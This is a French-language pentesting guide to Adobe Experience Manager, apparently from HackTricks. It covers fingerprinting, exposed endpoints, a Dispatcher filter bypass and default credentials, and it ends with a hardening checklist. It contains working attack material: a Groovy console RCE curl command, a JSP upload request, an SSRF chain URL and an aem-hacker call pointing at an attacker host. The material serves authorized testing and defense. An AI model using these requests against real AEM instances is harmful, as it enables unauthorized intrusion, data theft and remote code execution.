# AEM (Adobe Experience Manager) Pentesting

{{#include ../../banners/hacktricks-training.md}}

> Adobe Experience Manager (AEM, faisant partie de l'Adobe Experience Cloud) est un CMS d'entreprise qui fonctionne sur Apache Sling/Felix (OSGi) et un Java Content Repository (JCR).
> Du point de vue d'un attaquant, les instances AEM exposent très souvent des points de terminaison de développement dangereux, des règles de Dispatcher faibles, des identifiants par défaut et une longue liste de CVE qui sont corrigées chaque trimestre.

La liste de contrôle ci-dessous se concentre sur la **surface d'attaque accessible de l'extérieur (unauth)** qui continue d'apparaître dans des engagements réels (2022-2025).

---

## 1. Fingerprinting
```
$ curl -s -I https://target | egrep -i "aem|sling|cq"
X-Content-Type-Options: nosniff
X-Dispatcher: hu1            # header added by AEM Dispatcher
X-Vary: Accept-Encoding
```
Autres indicateurs rapides :
* `/etc.clientlibs/` chemin statique présent (retourne JS/CSS).
* `/libs/granite/core/content/login.html` page de connexion avec la bannière “Adobe Experience Manager”.
* `</script><!--/* CQ */-->` commentaire en bas de HTML.

---

## 2. Points de terminaison non authentifiés à haute valeur

Chemin | Ce que vous obtenez | Remarques
---- | ------------- | -----
`/.json`, `/.1.json` | Nœuds JCR via **DefaultGetServlet** | Souvent bloqué, mais *Dispatcher bypass* (voir ci-dessous) fonctionne.
`/bin/querybuilder.json?path=/` | API QueryBuilder | Fuite de l'arbre des pages, chemins internes, noms d'utilisateur.
`/system/console/status-*`, `/system/console/bundles` | Console OSGi/Felix | 403 par défaut ; si exposé & identifiants trouvés ⇒ RCE par téléchargement de bundle.
`/crx/packmgr/index.jsp` | Gestionnaire de paquets | Permet des paquets de contenu authentifiés → téléchargement de charge utile JSP.
`/etc/groovyconsole/**` | Console Groovy AEM | Si exposé → exécution arbitraire de Groovy / Java.
`/libs/cq/AuditlogSearchServlet.json` | Journaux d'audit | Divulgation d'informations.
`/libs/cq/ui/content/dumplibs.html` | Dump ClientLibs | Vecteur XSS.

### Astuce de contournement du Dispatcher
La plupart des sites de production se trouvent derrière le *Dispatcher* (reverse-proxy). Ses règles de filtrage peuvent être contournées en ajoutant une extension statique autorisée **après un point-virgule ou une nouvelle ligne encodée** :
```
GET /bin/querybuilder.json;%0aa.css?path=/home&type=rep:User HTTP/1.1
```
Une seule requête comme ci-dessus divulgue fréquemment des nœuds de profil utilisateur avec des adresses e-mail. P-T Partners a publié de bonnes recommandations sur cette faiblesse. 【】

---

## 3. Mauvaises configurations courantes (toujours présentes en 2025)

1. **Servlet POST anonyme** – `POST /.json` avec `:operation=import` vous permet de planter de nouveaux nœuds JCR. Bloquer `*.json` POST dans le Dispatcher le corrige. 【】
2. **Profils utilisateurs lisibles par tous** – l'ACL par défaut accorde `jcr:read` sur `/home/users/**/profile/*` à tout le monde.
3. **Identifiants par défaut** – `admin:admin`, `author:author`, `replication:replication`.
4. **WCMDebugFilter** activé ⇒ XSS réfléchi via `?debug=layout` (CVE-2016-7882, encore trouvé sur des installations héritées 6.4).
5. **Console Groovy exposée** – exécution de code à distance en envoyant un script Groovy :
```bash
curl -u admin:admin -d 'script=println "pwn".execute()' https://target/bin/groovyconsole/post.json
```

---

## 4. Vulnérabilités récentes (cadence des packs de services)

Trimestre | CVE | Affecté | Impact
------- | --- | -------- | ------
Déc 2024 | **CVE-2024-43711** | 6.5.21 et antérieur | Validation d'entrée incorrecte → **Exécution de code arbitraire** (nécessite une authentification à faible privilège). 【】
Déc 2024 | CVE-2024-43724/26 | 6.5.21 et antérieur | XSS DOM / Stocké dans l'assistant de déplacement de page. 【】
Déc 2023 | CVE-2023-48452/68 | ≤ 6.5.18 | XSS basé sur DOM via URL conçue. 【】
Déc 2022 | CVE-2022-30683 | ≤ 6.5.13 | Flaw de conception cryptographique → déchiffrement secret (nécessite des identifiants à faible privilège). 【】

Vérifiez toujours le bulletin *APSB* correspondant au pack de services du client et demandez le dernier **6.5.22** ou *Cloud Service 2024.11*.

---

## 5. Extraits d'exploitation

### 5.1 RCE via contournement du dispatcher + téléchargement JSP
Si l'écriture anonyme est possible :
```
# 1. Create a node that will become /content/evil.jsp
POST /content/evil.jsp;%0aa.css HTTP/1.1
Content-Type: application/x-www-form-urlencoded

:contentType=text/plain
jcr:data=<% out.println("pwned"); %>
:operation=import
```
Maintenant, demandez `/content/evil.jsp` – le JSP s'exécute avec l'utilisateur du processus AEM.

### 5.2 SSRF à RCE (historique < 6.3)
`/libs/mcm/salesforce/customer.html;%0aa.css?checkType=authorize&authorization_url=http://127.0.0.1:4502/system/console`
`aem_ssrf2rce.py` de **aem-hacker** automatise la chaîne complète. 【】

---

## 6. Outils

* **aem-hacker** – script d'énumération polyvalent, prend en charge le contournement du dispatcher, la détection SSRF, les vérifications de crédentials par défaut et plus encore.
```bash
python3 aem_hacker.py -u https://target --host attacker-ip
```【】
* **Brute-force de contenu** – demande récursivement `/_jcr_content.(json|html)` pour découvrir des composants cachés.
* **osgi-infect** – téléchargez un bundle OSGi malveillant via `/system/console/bundles` si des crédentials sont disponibles.

---

## 7. Liste de contrôle de durcissement (pour les recommandations de votre rapport)

1. Gardez l'instance sur le **dernier service pack cumulatif** (à partir de juil. 2025 : 6.5.22).
2. Supprimez/renouvelez les comptes par défaut ; appliquez SSO/SAML.
3. Renforcez les **filtres du Dispatcher** – refusez `;`, les nouvelles lignes encodées, et `*.json` ou `*.querybuilder.json` pour les utilisateurs anonymes.
4. Désactivez ou protégez les consoles (`/system/console`, `/crx/*`, `/etc/groovyconsole`) avec des listes d'autorisation IP.
5. Appliquez le package *Anonymous Permission Hardening* fourni par Adobe.

## Références

* Bulletin de sécurité Adobe APSB24-69 – “Mises à jour de sécurité pour Adobe Experience Manager (déc. 2024)”.
* 0ang3el – outil aem-hacker (GitHub).
{{#include ../../banners/hacktricks-training.md}}
